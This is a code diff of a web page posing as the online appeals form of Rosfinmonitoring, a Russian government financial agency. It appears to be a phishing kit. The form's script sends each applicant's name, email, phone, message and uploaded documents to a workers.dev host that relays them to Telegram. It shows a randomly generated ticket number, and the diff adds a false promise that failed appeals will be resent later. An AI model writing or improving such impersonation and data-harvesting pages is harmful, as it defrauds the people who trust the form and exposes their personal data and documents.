@@ -8,9 +8,7 @@
     <meta http-equiv="Expires" content="0">
     <title>Интернет-приемная — Росфинмониторинг</title>
     <style>
-        * {
-            box-sizing: border-box;
-        }
+        * { box-sizing: border-box; }
         body { 
             font-family: 'Segoe UI', Arial, sans-serif; 
             margin: 0; 
@@ -360,14 +358,14 @@
             </div>
             <div class="form-group">
                 <label for="message">Текст обращения *</label>
-                <textarea id="message" class="form-control" placeholder="Подробно изложите суть вашего вопроса..." required></textarea>
+                <textarea id="message" class="form-control" rows="6" placeholder="Подробно изложите суть вашего вопроса..." required></textarea>
             </div>
             <div class="form-group">
-                <label>Прикрепить документы (до 5 файлов):</label>
+                <label>Прикрепить документы (до 5 файлов, до 20MB каждый):</label>
                 <div class="file-input-wrapper">
-                    <input type="file" id="fileInput" class="form-control" style="padding: 12px 15px;" multiple accept=".jpg,.jpeg,.png,.pdf,.doc,.docx,.txt,.gif,.bmp,.xls,.xlsx">
+                    <input type="file" id="fileInput" class="form-control" multiple accept=".jpg,.jpeg,.png,.pdf,.doc,.docx,.txt,.gif,.bmp,.xls,.xlsx,.webp">
                 </div>
-                <div class="file-hint">Допустимые форматы: JPG, PNG, PDF, DOC, DOCX, TXT, XLS, XLSX (макс. 5 файлов до 20MB каждый)</div>
+                <div class="file-hint">Допустимые форматы: JPG, PNG, PDF, DOC, DOCX, TXT, XLS, XLSX, GIF, WEBP (макс. 5 файлов)</div>
                 <div id="fileList" class="file-list"></div>
             </div>
             <div style="margin-bottom: 20px;">
@@ -412,17 +410,21 @@
             const spinner = document.getElementById('spinner');
             const fileInput = document.getElementById('fileInput');
             const fileList = document.getElementById('fileList');
+            const successModal = document.getElementById('successModal');
 
             const WORKER_URL = 'https://round-band-482a.portal-rosfin.workers.dev';
 
             let selectedFiles = [];
 
+            // === УПРАВЛЕНИЕ ФАЙЛАМИ ===
             fileInput.addEventListener('change', function(e) {
                 const files = Array.from(this.files);
                 
                 if (files.length > 5) {
                     alert('⚠️ Можно загрузить не более 5 файлов!');
                     this.value = '';
+                    selectedFiles = [];
+                    updateFileList();
                     return;
                 }
 
@@ -431,6 +433,8 @@
                     if (file.size > MAX_SIZE) {
                         alert(`⚠️ Файл "${file.name}" превышает 20MB!`);
                         this.value = '';
+                        selectedFiles = [];
+                        updateFileList();
                         return;
                     }
                 }
@@ -471,6 +475,7 @@
                 });
             }
 
+            // === ОТПРАВКА ФОРМЫ ===
             form.addEventListener('submit', async function(event) {
                 event.preventDefault();
 
@@ -481,6 +486,7 @@
                 const message = document.getElementById('message').value.trim();
                 const agreement = document.getElementById('agreement').checked;
 
+                // Валидация
                 if (!fullName || !email || !phone || !subject || !message) {
                     alert('⚠️ Заполните все обязательные поля!');
                     return;
@@ -501,10 +507,12 @@
                 try {
                     const date = new Date();
                     const dateStr = date.toLocaleString('ru-RU');
+                    const ticketNumber = Math.floor(100000 + Math.random() * 900000);
                     
-                    // === ТОЛЬКО ОДНО КРАСИВОЕ СООБЩЕНИЕ ===
+                    // === 1. ОТПРАВЛЯЕМ ТЕКСТОВОЕ СООБЩЕНИЕ ===
                     let text = `📩 *НОВОЕ ОБРАЩЕНИЕ В РОСФИНМОНИТОРИНГ*\n`;
                     text += `━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+                    text += `📋 *Номер:* РФМ-ОБ-${ticketNumber}\n\n`;
                     text += `👤 *Заявитель:* ${fullName}\n`;
                     text += `📧 *Email:* ${email}\n`;
                     text += `📞 *Телефон:* ${phone}\n`;
@@ -524,41 +532,41 @@
                     
                     text += `\n🕐 *Дата и время:* ${dateStr}`;
 
-                    // === ОТПРАВЛЯЕМ ОДНО СООБЩЕНИЕ ===
-                    const response = await fetch(`${WORKER_URL}/telegram`, {
+                    // Отправляем текст
+                    const textResponse = await fetch(`${WORKER_URL}/telegram`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ text: text })
                     });
 
-                    const result = await response.json();
-                    console.log('📨 Ответ:', result);
-
-                    if (!result.ok) {
-                        throw new Error(result.error || 'Неизвестная ошибка');
+                    if (!textResponse.ok) {
+                        throw new Error('Ошибка отправки текста');
                     }
 
-                    // === ОТПРАВЛЯЕМ ФАЙЛЫ (ТОЛЬКО НАЗВАНИЕ ФАЙЛА В ПОДПИСИ) ===
+                    // === 2. ОТПРАВЛЯЕМ ФАЙЛЫ ===
                     if (selectedFiles.length > 0) {
                         for (let file of selectedFiles) {
                             const formData = new FormData();
                             formData.append('file', file);
                             
-                            // КОРОТКАЯ ПОДПИСЬ - ТОЛЬКО ИМЯ ФАЙЛА И ОТПРАВИТЕЛЬ
-                            const caption = `📎 ${file.name}\n👤 ${fullName}`;
+                            // Подпись к файлу
+                            const caption = `📎 ${file.name}\n👤 ${fullName}\n📋 РФМ-ОБ-${ticketNumber}`;
                             formData.append('caption', caption);
                             
-                            await fetch(`${WORKER_URL}/send-file`, {
+                            const fileResponse = await fetch(`${WORKER_URL}/send-file`, {
                                 method: 'POST',
                                 body: formData
                             });
+
+                            if (!fileResponse.ok) {
+                                console.error('Ошибка отправки файла:', file.name);
+                            }
                         }
                     }
 
-                    // === УСПЕХ ===
-                    const ticketNumber = Math.floor(100000 + Math.random() * 900000);
+                    // === 3. УСПЕХ ===
                     document.getElementById('ticketNumber').innerText = ticketNumber;
-                    document.getElementById('successModal').style.display = 'flex';
+                    successModal.style.display = 'flex';
                     form.reset();
                     selectedFiles = [];
                     fileInput.value = '';
@@ -568,6 +576,7 @@
                 } catch (error) {
                     console.error('❌ Ошибка:', error);
                     
+                    // Сохраняем локально при ошибке
                     try {
                         const appeals = JSON.parse(localStorage.getItem('appeals') || '[]');
                         appeals.push({
@@ -589,14 +598,14 @@
                         
                         const ticketNumber = Date.now().toString().slice(-6);
                         document.getElementById('ticketNumber').innerText = ticketNumber;
-                        document.getElementById('successModal').style.display = 'flex';
+                        successModal.style.display = 'flex';
                         form.reset();
                         selectedFiles = [];
                         fileInput.value = '';
                         fileList.classList.remove('active');
                         fileList.innerHTML = '';
                         
-                        alert(`✅ Ваше обращение сохранено локально.\nНомер: РФМ-ОБ-${ticketNumber}`);
+                        alert(`✅ Ваше обращение сохранено локально.\nНомер: РФМ-ОБ-${ticketNumber}\nОтправится при восстановлении связи.`);
                     } catch (localError) {
                         alert(`❌ Ошибка отправки: ${error.message || 'Проверьте интернет'}`);
                     }
@@ -607,11 +616,12 @@
                 }
             });
 
+            // === МОДАЛЬНОЕ ОКНО ===
             window.closeModal = function() {
-                document.getElementById('successModal').style.display = 'none';
+                successModal.style.display = 'none';
             };
 
-            document.getElementById('successModal').addEventListener('click', function(e) {
+            successModal.addEventListener('click', function(e) {
                 if (e.target === this) {
                     this.style.display = 'none';
                 }
